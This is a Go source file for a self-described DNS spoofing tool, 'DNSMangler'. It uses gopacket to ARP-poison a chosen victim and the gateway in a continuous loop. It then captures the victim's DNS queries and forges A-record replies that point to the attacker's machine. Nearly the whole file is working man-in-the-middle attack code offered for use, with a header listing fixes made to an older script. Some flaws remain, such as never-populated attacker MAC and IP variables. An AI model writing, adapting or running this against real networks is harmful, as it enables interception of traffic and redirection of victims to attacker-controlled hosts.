package main

/*
DATE OF OG SCRIPT: November 5 2015
FUNCTIONS:
	main()
	arpPoison(targetMAC, gateway, gatewayMAC string)
	writePoison(arpPacket layers.ARP, etherPacket layers.Ethernet)
	mangleDNS()
	craftAnswer(ethernetLayer *layers.Ethernet, ipLayer *layers.IPv4, dnsLayer *layers.DNS, udpLayer *layers.UDP) []byte
ABOUT:
	main.go is the central code body for the DNSMangler funciton, it contains all functions related to spoofing dns.

PROBLEMS in the script from original script write and publishing:
	Main function was not declared
	ERROR function was not declared
	PACKETS wouldnt send
	packet function was not corrected/written
	code wasnt tested
	VARS used wrong
	constants unused
	handelers set wrong
	no control
	some spots used semicolons in the print statements
	used old C style like GO which was deprecated right after december 7th 2014
	print format was off or incorrect
	output was glitchy
	bytes wouldnt transform
	malformed data packets
	control protocal hex was missing
	wrong formatting for print statements used FprintF instead of Printf
	flags were set wrong in the main function to where they couldnt be called else where
	flags not set properly
	flag defined as := not =
	command line help was not defined
	error during byte decoding
	index range for slide was out of bounds
	slices were used in some functions but were preventing the script from causing runtime error
	concurrency was not implimented
	script heavyweight on the network cards and CPU



	================= What was fixed ==================

	everything was rewritten, updated, regex was used, concurrency added, flags and const's/vars
	were written and defined properly so for no issue
*/
import (
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"os/signal"
	"regexp"
	"strings"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

var (
	targetPtr     = flag.String("targetspoof", "127.0.0.1", "The address of the host for spoofing.")
	targetMAC     = flag.String("targetmac", "FF:FF:FF:FF:FF:FF", "The target mac address.")
	interfacePtr  = flag.String("interface", "eth0", "The interface for the backdoor to monitor for incoming connection, defaults to eth0.")
	gatewayPtr    = flag.String("GatewayposionIP", "127.0.0.1", "Sets the gateway to poison.")
	gatewayMAC    = flag.String("GatewayMac", "FF:FF:FF:FF:FF:FF", "Sets the gateway MAC address.")
	err           error
	handle        *pcap.Handle
	ipAddr        net.IP
	macAddr       net.HardwareAddr
	target        string
	udpLayer      layers.UDP
	dnsLayer      layers.DNS
	ipLayer       layers.IPv4
	ethernetLayer layers.Ethernet
	clear_hex     = "\x1b[H\x1b[2J\x1b[3J"
	rev           = "\033[0;39m"
	reb           = "\033[49m"
	red           = "\033[0;31m"
	wht           = "\033[0;37m"
	redb          = "\033[41m"
	grnb          = "\033[42m"
	yelb          = "\033[43m"
	BLK           = "\033[0;30m"
	RED           = "\033[0;31m"
	GRN           = "\033[0;32m"
	YEL           = "\033[0;33m"
	BLU           = "\033[0;34m"
	MAG           = "\033[0;35m"
	CYN           = "\033[0;36m"
	WHT           = "\033[0;37m"
	BBLK          = "\033[1;30m"
	BRED          = "\033[1;31m"
	BGRN          = "\033[1;32m"
	BYEL          = "\033[1;33m"
	BBLU          = "\033[1;34m"
	BMAG          = "\033[1;35m"
	BCYN          = "\033[1;36m"
	BWHT          = "\033[1;37m"
	UBLK          = "\033[4;30m"
	URED          = "\033[4;31m"
	UGRN          = "\033[4;32m"
	UYEL          = "\033[4;33m"
	UBLU          = "\033[4;34m"
	UMAG          = "\033[4;35m"
	UCYN          = "\033[4;36m"
	UWHT          = "\033[4;37m"
	BLKB          = "\033[40m"
	REDB          = "\033[41m"
	GRNB          = "\033[42m"
	YELB          = "\033[43m"
	BLUB          = "\033[44m"
	MAGB          = "\033[45m"
	CYNB          = "\033[46m"
	WHTB          = "\033[47m"
	BLKHB         = "\033[0;100m"
	REDHB         = "\033[0;101m"
	GRNHB         = "\033[0;102m"
	YELHB         = "\033[0;103m"
	BLUHB         = "\033[0;104m"
	MAGHB         = "\033[0;105m"
	CYNHB         = "\033[0;106m"
	WHTHB         = "\033[0;107m"
	HBLK          = "\033[0;90m"
	HRED          = "\033[0;91m"
	HGRN          = "\033[0;92m"
	HYEL          = "\033[0;93m"
	HBLU          = "\033[0;94m"
	HMAG          = "\033[0;95m"
	HCYN          = "\033[0;96m"
	HWHT          = "\033[0;97m"
	BHBLK         = "\033[1;90m"
	BHRED         = "\033[1;91m"
	BHGRN         = "\033[1;92m"
	BHYEL         = "\033[1;93m"
	BHBLU         = "\033[1;94m"
)

// packet variable
var (
// ARP PING PACKET

)

// online
func online(url string) bool {
	resp, err := http.Get(url)
	checkError(err, "[ ERR ] During execution of line 147 GET request => ( Error ) out at line 148", "log", 1)
	if resp.StatusCode <= 100 {
		fmt.Println("USER: DATA: GET: HTTP: LOG: USER OFFLINE GET REQUEST AT CODE 100")
		os.Exit(1)
		return false
	} else {
		return true
	}
}

// sig handeler
func handelreturncon(c chan os.Signal) {
	signal.Notify(c, os.Interrupt)
	for s := <-c; ; s = <-c {
		switch s {
		case os.Interrupt:
			fmt.Println("\nDetected Interupt.....")
			os.Exit(1)
		case os.Kill:
			fmt.Println("\n\n\tKILL received")
			os.Exit(1)
		}
	}
}

// errror handeling function, where
// msg = warning/errror message to parse with err type
// typer is a type of statement that will be used to output the
// err data, such as println, log, fatal etc
// bool and exit code to return exit status
func checkError(err error, msg string, typer string, exit_code int) bool {
	if err != nil {
		if typer == "fmt" {
			fmt.Println(err, msg, exit_code)
			os.Exit(exit_code)
		}
		if typer == "log" {
			log.Fatal(err, msg)
			os.Exit(exit_code)
		}
	} else {
		return true
	}
	return true
}

// mac REGEX: regex = “^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})|([0-9a-fA-F]{4}\\.[0-9a-fA-F]{4}\\.[0-9a-fA-F]{4})$”;
// IPA REGEX: regex = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"
// VALIDATION FOR IPV4 ADDR's
func valip4(ipa string) bool {
	ipa = strings.Trim(ipa, " ")

	re, _ := regexp.Compile(`^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$`)
	if re.MatchString(ipa) {
		fmt.Println("\t\t\t", wht+"["+grnb+"DATA"+rev+reb+wht+"]"+wht+"    ["+BLUB+"IPA CHECK PASSED"+wht+"         ] => "+rev+reb+red, ipa)

		return true
	}
	fmt.Println(false)
	return false
}

// VALIDATION FOR MAC ADDR's
func valMAC(mac string) bool {
	mac = strings.Trim(mac, " ")
	re, _ := regexp.Compile(`^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})|([0-9a-fA-F]{4}\\.[0-9a-fA-F]{4}\\.[0-9a-fA-F]{4})$`)
	if re.MatchString(mac) {
		fmt.Println("\t\t\t", wht+"["+grnb+"DATA"+rev+reb+wht+"]"+wht+"    ["+BLUB+"MAC CHECK PASSED"+wht+"         ] => "+rev+reb+red, mac)
		return true
	}
	fmt.Println(false)
	return false
}

// FUNCTION CLEAR AND BANNER ASCII
// function will also create a table of your targets from
// parsing the flags
func FrontDesignerParser(hex, color string) {
	flag.Parse()
	fmt.Println(hex)
	content, err := ioutil.ReadFile("banner.txt")
	checkError(err, "[ ERORR ] Error on line 176 during the execution of `ioutil.readfile` banner.txt ", "log", 1)
	fmt.Println(color, string(content))
	fmt.Println(color, "\t| Target Spoofed ADDR  | Target MAC ADDR      | Interface  | Gateway IP  | Gateway MAC            |")
	//                    | 10.0.0.1             |  FF:FF:FF:FF:FF:FF   | wlan0mon   | 127.0.0.1   | FF:FF:FF:FF:FF:FF      |
	fmt.Println(color, "\t|----------------------|----------------------|------------|-------------|------------------------|")
	fmt.Printf("\t|%s              |%s     |%s        |%s    |%s       |\n", *targetPtr, *targetMAC, *interfacePtr, *gatewayPtr, *gatewayMAC)
	fmt.Println("\t|----------------------|----------------------|------------|-------------|------------------------|")
	fmt.Print("\n\n\n")
	fmt.Println("                  				ATTACK TABLE  ")
	fmt.Println("----------------------------------------------------------------------------------------------------------")
}

/*
    FUNCTION: main()
    RETURNS: Nothing
    ARGUMENTS: None
    ABOUT:
    Grabs incoming arguments and activates the ARP poisoning thread and the DNS spoofing functionality.
		Also grabs host addresses for use later on and sets global variables.
*/

func interip(intf string) {
	itf, _ := net.InterfaceByName(intf)
	item, _ := itf.Addrs()
	var ip net.IP
	for _, addr := range item {
		switch v := addr.(type) {
		case *net.IPNet:
			if !v.IP.IsLoopback() {
				if v.IP.To4() != nil {
					ip = v.IP
				}
			}
		}
	}
	if ip != nil {
		fmt.Println("IP of interface " + intf + " => " + ip.String())
	} else {
		fmt.Println(intf, "has IP NIL>? => ", ip.String())
	}
}

func main() {
	flag.Parse()
	FrontDesignerParser(clear_hex, RED)
	val1 := string(*targetMAC)
	val2 := string(*targetPtr)
	valMAC(val1)
	valip4(val2)
	online("https://www.google.com")
	handle, err = pcap.OpenLive(*interfacePtr, 1600, false, pcap.BlockForever)
	checkError(err, "[ ERROR ] WARN: During execution on line 152 to line 153 ( error ) the following occured", "log", 2)

	err = handle.SetBPFFilter("dst port 53")
	checkError(err, "[ ERROR ] WARN: During execution on line 155 to line 156 ( error ) the following occured", "log", 1)

	defer handle.Close()
	// this function was odly causing an error, grabaddresses was a massive deprecation from golang
	// unless someone was or had a module but at the same time this code had alot of function calling in it
	// where the function didnt even exist
	//macAddr, ipAddr = grabAddresses(*interfacePtr)
	// to solve this and update it im calling a new func called interip
	target = *targetPtr
	interip(*interfacePtr)
	arpPoison(*targetMAC, *gatewayPtr, *gatewayMAC)
	mangleDNS()
}

func arpPoison(targetMAC, gateway, gatewayMAC string) {
	gw := (net.ParseIP(gateway))
	tg := (net.ParseIP(target))
	tgm, _ := net.ParseMAC(targetMAC)
	gwm, _ := net.ParseMAC(gatewayMAC)
	ethernetPacket := layers.Ethernet{}
	ethernetPacket.DstMAC = tgm
	ethernetPacket.SrcMAC = macAddr
	ethernetPacket.EthernetType = layers.EthernetTypeARP
	arpPacket := layers.ARP{}
	arpPacket.AddrType = layers.LinkTypeEthernet
	arpPacket.Protocol = 0x0806
	arpPacket.HwAddressSize = 6
	arpPacket.ProtAddressSize = 4
	arpPacket.Operation = 2
	//poison the target
	arpPacket.SourceHwAddress = macAddr
	arpPacket.SourceProtAddress = gw
	arpPacket.DstHwAddress = tgm
	arpPacket.DstProtAddress = tg
	gwEthernetPacket := ethernetPacket
	gwARPPacket := arpPacket
	//poison the gateway
	gwARPPacket.SourceProtAddress = tg
	gwARPPacket.DstHwAddress = gwm
	gwARPPacket.DstProtAddress = gw
	counter := 0
	for {
		counter += 1
		fmt.Println("\t\t\t", wht+"["+yelb+"WARN"+rev+reb+wht+"]"+wht+"    ["+yelb+"Writing ARP Packet"+wht+"   ] ")
		writePoison(arpPacket, ethernetPacket)
		fmt.Println("\t\t\t", wht+"["+grnb+"DATA"+rev+reb+wht+"]"+wht+"    ["+redb+"SENT ARP => "+wht+"         ] "+rev+reb+red, counter)

		time.Sleep(1 * time.Second)
		fmt.Println("\t\t\t", wht+"["+yelb+"WARN"+rev+reb+wht+"]"+wht+"    ["+yelb+"Writing Poison Packet"+wht+"] ")
		writePoison(gwARPPacket, gwEthernetPacket)
		fmt.Println("\t\t\t", wht+"["+grnb+"DATA"+rev+reb+wht+"]"+wht+"    ["+redb+"SENT POSION => "+wht+"      ] "+rev+reb+red, counter)

		time.Sleep(1 * time.Second)
	}

}

/*
   FUNCTION: writePoison(arpPacket layers.ARP, etherPacket layers.Ethernet){
   RETURNS: Nothing
   ARGUMENTS:
               *layers.ARP arpPacket - the arp packet to write to the line
               *layers.Ethernet etherPacket - the ethernet packet to write to the line
   ABOUT:
   Actually writes the arp and ethernet packets used in poisoning to the global handle.
*/
func writePoison(arpPacket layers.ARP, etherPacket layers.Ethernet) {
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{}

	gopacket.SerializeLayers(buf, opts, &etherPacket, &arpPacket)
	packetData := buf.Bytes()

	err := handle.WritePacketData(packetData[:42])
	checkError(err, "[ ERROR ] WARN: During execution on line 356 to line 357 ( error ) the following occured", "log", 1)
}

/*
    FUNCTION: mangleDNS(){
    RETURNS: Nothing
    ARGUMENTS: None
    ABOUT:
    Performs the DNS spoofing against the victims machine. Sets all dns traffic to redirect to the host
		machines IP address.
*/

func mangleDNS() {
	fmt.Println("\t\t\t", wht+"["+REDHB+"DATA"+rev+reb+wht+"]"+wht+"    ["+redb+"Listening for packets"+wht+"      ] ")

	decoder := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethernetLayer, &ipLayer, &udpLayer, &dnsLayer)
	decoded := make([]gopacket.LayerType, 0, 4)

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for {
		packet, err := packetSource.NextPacket()
		checkError(err, "[ ERROR ] WARN: During execution on line 377 to line 378 ( error ) the following occured", "log", 1)

		err = decoder.DecodeLayers(packet.Data(), &decoded)
		checkError(err, "[ ERROR ] WARN: During execution on line 380 to line 381 ( error ) the following occured", "log", 1)

		if len(decoded) != 4 {
			fmt.Println(wht + "[" + redb + "ERROR" + rev + reb + wht + "]" + wht + "    [" + yelb + "NOT ENOUGH LAYERS" + wht + "] ")
			continue
		}
		fmt.Print("\n\n")
		fmt.Println(wht + "[" + redb + "DATA PACKET SENT TO NETADDR PACKET CAPTURE AND WATCHDOG STAT" + reb + wht + "]")
		fmt.Println(packet)

		buffer := Crafter(&ethernetLayer, &ipLayer, &dnsLayer, &udpLayer)
		fmt.Println("======================================== BUFFER RETURN QUERY ====================================")
		fmt.Println(buffer)
		if buffer == nil {
			try := "buffer = nil"
			fmt.Println("\t\t\t", wht+"["+redb+"WARN"+rev+reb+wht+"]"+wht+"    ["+yelb+try+wht+"] ")
			continue
		} else {
			fmt.Println(buffer)
		}

		err = handle.WritePacketData(buffer)
		checkError(err, "[ ERROR ] WARN: During execution on line 402 to line 403 ( error ) the following occured", "log", 1)

	}
}

/*
FUNC Name  => Crafter
FUNC DATA  => Returns the byte array containing the spoofed response DNS packet data
FUNC ABOUT => Vrafts the spoofed DNS packet using the incoming query
*/

func Crafter(ethernetLayer *layers.Ethernet, ipLayer *layers.IPv4, dnsLayer *layers.DNS, udpLayer *layers.UDP) []byte {

	//if not a question return empty
	if dnsLayer.QR || ipLayer.SrcIP.String() != target {
		return nil
	} else {
		fmt.Println(dnsLayer.QDCount, ipLayer.SrcIP.String(), dnsLayer.NSCount)
	}

	//must build every layer to send DNS packets
	ethMac := ethernetLayer.DstMAC
	ethernetLayer.DstMAC = ethernetLayer.SrcMAC
	ethernetLayer.SrcMAC = ethMac

	ipSrc := ipLayer.SrcIP
	ipLayer.SrcIP = ipLayer.DstIP
	ipLayer.DstIP = ipSrc

	srcPort := udpLayer.SrcPort
	udpLayer.SrcPort = udpLayer.DstPort
	udpLayer.DstPort = srcPort
	err = udpLayer.SetNetworkLayerForChecksum(ipLayer)
	checkError(err, "[ ERROR ] WARN: During execution on line 314 to line 315 ( error ) the following occured", "log", 1)

	var answer layers.DNSResourceRecord
	answer.Type = layers.DNSTypeA
	answer.Class = layers.DNSClassIN
	answer.TTL = 200
	answer.IP = ipAddr

	dnsLayer.QR = true

	for _, q := range dnsLayer.Questions {
		if q.Type != layers.DNSTypeA || q.Class != layers.DNSClassIN {
			fmt.Println(q)
			continue
		}

		answer.Name = q.Name

		dnsLayer.Answers = append(dnsLayer.Answers, answer)
		dnsLayer.ANCount = dnsLayer.ANCount + 1
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	err = gopacket.SerializeLayers(buf, opts, ethernetLayer, ipLayer, udpLayer, dnsLayer)
	checkError(err, "[ ERROR ] WARN: During execution on line 347 to line 348 ( error ) the following occured", "log", 1)

	return buf.Bytes()
}
